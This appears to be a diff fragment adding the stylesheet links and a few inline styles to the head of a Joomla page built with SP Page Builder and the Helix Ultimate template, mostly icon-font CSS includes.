+	<link href="/media/com_sppagebuilder/assets/iconfont/icofaqapr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomplxzb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxatkmu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoklrgol/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolnuioe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoebvify/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotzzbbt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojbtjtm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotoqbwm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoczbhbz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyokttm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoinbrxf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopddtyv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocdbzcy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodgdeih/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocqfnqw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoihygyn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoemydjm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolxnwbm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyuiiyh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/cox/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/n3s/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotdktap/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofuc5ox/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/shxt_yiwlcs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/shxt_hvnpiw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/shxt_grlhaw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/shxt_zurpqk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/shxt_iqqxcs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolhqygf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorlt0ws/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icom6hqdw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoehf49z/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icob1avfb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icol1r6am/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico4xyweo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoi0zg70/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icof1myrt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoaxvwtp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico2dg6aq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icom184d1/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolbveqz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icog2f62v/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico3ccqkh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico7h42as/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoldsngh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiyytvs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoehzdpo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconecgey/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqhgftv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomrntgr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico59syxz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohluj96/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoh1c0cz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico9wfigk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico0nibsw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqozkk8/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icot6t6rg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogqbc5u/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoy4fy5m/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icod2gb04/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozokeb4/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icot3nw9o/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico94vrpc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico1nq08a/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/gecko_yusboh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/gecko_uqyieg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/gecko_duewxw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokgcfbm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomhmnid/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosuqjjh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotuaxvx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorgwikj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogfkcqg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqfxgiv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoolaerh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoatqtlk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoryopzm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokdscjz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomfyiyv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoffkbpl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopkhqlr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogjdbvr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiywbbd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocljqzl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxynhev/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorahrun/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icougztpn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoirgxsq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoksfowh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyjkqkr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyfzwmp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouzojrd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoladzya/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoupdnuf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolwgmml/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icougcwog/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconfigvt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocfnvlg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowxzgpy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodunewz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojcimym/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozabbtk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogoifsj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoegagbt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoycigdt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojkpiuu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotpawfh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolqltjg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolusupd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowuczxk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocdkrlj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorslsuf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorndwgi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/ico13z2lu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxsfico/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoimketr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoocyaoy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojybnws/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoooxpkp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohxwzha/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotcoosj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogzawnb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoybvtsg/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoftquet/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooiqgvs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooecwdb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icounuzvp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqnitef/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqigdgu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooytnmy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohtfsbe/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofbexmk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozhjhyk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxinbfs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoccwdma/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocpdqvy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogksiok/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorrbwid/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowvyfrj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojzpgcp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoafmjct/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icooilffn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxzdwlo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozdtjon/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocxbqgb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icolksenl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icowabdgl/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofjifgb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodrqsek/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogspjev/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodwqqdh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icormgbuy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobdxuqp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobqhbmh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoaiydzm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icousxcvt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icovcvfpn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodwhvta/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyeyedr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocizfjr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohvosqq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconruivq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorphgfq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconmerto/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoxkeiub/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomgxush/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocpxnlc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/iconrcpyt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotkultt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icopcjsyw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogcagkv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoujqcpy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icompbjxj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icondunru/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomypmrt/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouwyoaj/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icogvdgcd/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouoxjvx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotabswy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoeeflxs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomofrio/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icozloxxs/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icobrcstm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocieptk/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouxinwr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoeouxap/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icohnltsc/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icow8t8pq/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoi13nle/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icof1ujxu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icork2oo2/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotdcbbn/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodxsbkr/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icox3mpx2/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icok6n3vi/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyuigwm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqungpw/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icodblbvo/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoklymgz/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomfzamx/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoiqqrck/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoduksub/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoyzlgxv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icouutwdf/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokcuqtm/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorupmft/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotjcrmb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icojosycp/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoacqrui/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoqclenu/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icokuaxgv/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icoirjsxb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icosdnari/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icocexvfb/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomrntlh/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icorgtgey/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icomqcejy/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icofnosca/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/iconfont/icotptfke/style.css?217b811579be5321f877111c3a09a761" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/google-fonts/Berkshire Swash/stylesheet.css" rel="stylesheet">
+	<link href="/media/com_sppagebuilder/assets/google-fonts/Aguafina Script/stylesheet.css" rel="stylesheet">
+	<link href="/media/com_icagenda/icicons/style.css?d32832" rel="stylesheet">
+	<link href="/plugins/system/jce/css/content.css?badb4208be409b1335b815dde676300e" rel="stylesheet">
+	<link href="/templates/shaper_helixultimate/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/plugins/system/helixultimate/assets/css/system-j4.min.css" rel="stylesheet">
+	<link href="/media/system/css/joomla-fontawesome.min.css?d32832" rel="stylesheet">
+	<link href="/templates/shaper_helixultimate/css/template.css" rel="stylesheet">
+	<link href="/templates/shaper_helixultimate/css/presets/preset1.css" rel="stylesheet">
+	<link href="http://lw24.pl/modules/mod_datetime/tmpl/default.min.css" rel="stylesheet">
+	<link href="/modules/mod_a4w_infociacho/tmpl/css/style-default.css" rel="stylesheet">
+	<style>@media(min-width: 1400px) {.sppb-row-container { max-width: 1320px; }}</style>
+	<style>column-id-1693244652581 {
+       backdrop-filter: blur(7px);
+}
+#column-wrap-id-1693244652582 {
+       backdrop-filter: blur(5px);
+}
+</style>
